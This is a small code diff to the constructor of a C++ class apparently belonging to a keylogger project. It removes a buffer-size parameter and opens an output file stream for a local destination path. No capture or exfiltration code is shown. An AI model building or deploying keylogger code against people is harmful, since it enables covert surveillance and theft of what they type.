@@ -1,7 +1,7 @@
 #include "./keylogger_local.hpp"
 
-keylogger_local::keylogger_local(size_t p_buffer_size, string p_destination_path) :
-		keylogger(p_buffer_size)
+keylogger_local::keylogger_local(string p_destination_path) :
+		keylogger()
 {
 	a_ofstream = new ofstream();
 
